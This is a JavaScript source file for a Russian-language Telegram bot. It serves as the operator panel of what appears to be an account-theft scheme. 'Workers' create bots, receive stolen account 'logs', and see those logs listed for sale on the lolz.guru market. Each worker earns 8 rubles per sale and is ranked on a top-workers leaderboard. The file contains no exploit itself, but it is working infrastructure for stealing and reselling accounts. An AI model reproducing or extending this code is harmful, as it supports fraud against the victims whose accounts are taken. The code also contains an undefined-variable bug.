// my modules import

const { token } = require("./config");
const db = require("./database");
const cmdStart = require("./botCreatingTools/cmdWorking");
const axios = require("axios");
const createBotScene = require("./scenes/createBotScene");

// modules import

const {Telegraf, session, Scenes: { WizardScene, Stage }} = require("telegraf");

const fire = require("firebase/database");
const { ref, get, child, set, update } = require("firebase/database");
const createConfig = require("./botCreatingTools/createConfig");
const createBot = require("./botCreatingTools/createBot");
const cmdWorking = require("./botCreatingTools/cmdWorking");

// bot work

const bot = new Telegraf(token);

const stage = new Stage([createBotScene]);

bot.use(session());
bot.use(stage.middleware());

bot.start(async(ctx) => {
    const keyboard = {
        keyboard: [[{text: "👨🏼‍💻Ваш профиль"}], [{text: "Информация"}, {text: "Топ воркеров"}, {text: "Создать бота"}]],
        resize_keyboard: true
    }

    const user_data = await get(child(ref(db), `users/${ctx.chat.id}`))
    const user = user_data.val();

    if(user != null) return await ctx.reply("Вы вернулись в панель!", {reply_markup: keyboard});
    const user_info = {
        logs: {
            logsAllTime: 0,
            logsMonth: 0,
            logsDay: 0
        },
        balance: 0,
        balanceAllTime: 0
    }

    await update(child(ref(db), `users/${ctx.chat.id}`), user_info);
    await ctx.reply("Добро пожаловать в нашу команду! Удачной работы!", {reply_markup: keyboard});
});

bot.hears("Топ воркеров", async (ctx) => {
    const top_data = await(get(child(ref(db), `top`)))
    const top = top_data.val()

    const top_keys = Object.keys(top).sort((b, c) => top[c].logsAllTime - top[b].logsAllTime);
    let str = "____________⚒ Топ воркеров за всё время____________\n\nЛогов за всё время|Логов за месяц|Логов за сегодня\n\n\n"
    for(let i = 0; i < 10; i++) {
        if(top_keys[i] == undefined) break;

        const top_user = top[top_keys[i]]
        str += `${i+1}. ${top_user.logsAllTime}|${top_user.logsMonth}|${top_user.logsDay}\n`;
    }

    const i_user = top[ctx.chat.id];
    if(top_keys.indexOf(ctx.chat.id) > 9) str += `\n...\n\n${top_keys.indexOf(ctx.chat.id)+1}. ${i_user.logsAllTime}|${i_user.logsMonth}|${i_user.logsDay}`
    await ctx.reply(str);
})

bot.hears("👨🏼‍💻Ваш профиль", async (ctx) => {
    const user_data = await get(child(ref(db), `users/${ctx.chat.id}`))
    const user = user_data.val();

    if(user == null) return await ctx.reply("Пропишите /start");

    const keyboard = {
        inline_keyboard: [[{text: "Вывести деньги", callback_data: "withdraw_money"}]]
    }

    const { balance, balanceAllTime } = user
    const { logsAllTime, logsMonth, logsDay } = user.logs;

    await ctx.reply(`Ваш профиль\n\nЛогов всего: ${logsAllTime}\nЛогов за месяц: ${logsMonth}\nЛогов за день: ${logsDay}\n\nБаланс: ${balance}₽\nВсего заработано: ${balanceAllTime}₽`, {reply_markup: keyboard})
});

bot.hears("Создать бота", async (ctx) => {
    ctx.scene.enter("createBotScene");
})

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

const getUpdates = async () => {
    const updatesData = await axios.get("http://localhost:5000/getUpdates");
    const updates = updatesData.data;

    for(let update of updates)
    {
        // newAccount
        if(update.type == "newAccount")
        {
            try{
            await bot.telegram.sendMessage(update.worker_id, `🎉 Вам пришёл лог #${update.id}! Лог выставляется на маркет, ожидайте.`);
            }
            catch {

            }
        }

        if(update.type == "accCantSell") {
            try{
            await bot.telegram.sendMessage(update.worker_id, `❌ Лог #${update.id} не удалось продать, так как аккаунт стал невалид.`)
            }
            catch {

            }
        }

        if(update.type == "accAddedOnSell") {
            try{
                await bot.telegram.sendMessage(update.worker_id, `✅ Лог #${update.id} был выставлен на продажу! Ожидайте пока его купят.`)
            }
            catch {

            }
        }

        if(update.type == "accSelled") {
            const item_id = update.accLink.replace("https://lolz.guru/market/", "");
            const accsOnSellData = await get(child(ref(db), `accountsOnSell`));
            const accsOnSell = accsOnSellData.val();

            const data = accsOnSell[item_id]
            delete accsOnSell[item_id];

            await fire.update(child(ref(db), `accountsOnSell`), accsOnSell);

            try {
                await bot.telegram.sendMessage(data.worker_id, `🎉 Лог #${data.id} был продан! Вам было зачислено 8 rub!`);
            }
            catch {

            }

            const user_data = await get(child(ref(db), `users/${data.worker_id}`));
            const user = user_data.val();

            user.balance += 8;
            user.balanceAllTime += 8;

            user.logs.logsAllTime += 1;
            user.logs.logsMonth += 1;
            user.logs.logsDay += 1;

            await fire.update(child(ref(db), `users/${data.worker_id}`), user);

            const top_data = await get(child(ref(db), `top`));
            const top = top_data.val();

            top[worker_id] = {logsAllTime: user.logs.logsAllTime, logsMonth: user.logs.logsMonth, logsDay: user.logs.logsDay};

            await fire.update(child(ref(db), `top`), top);

            // const top_values = Object.keys(top).sort((b, c) => top[c] - top[b]);const top_values = Object.keys(top).sort((b, c) => top[c] - top[b]);

        }
    }
}

const checkUpdates = new Promise(async (reslove, reject) => {
    while(true)
    {
        await getUpdates();
        await sleep(100);
    }
})

Promise.all([checkUpdates])

bot.launch();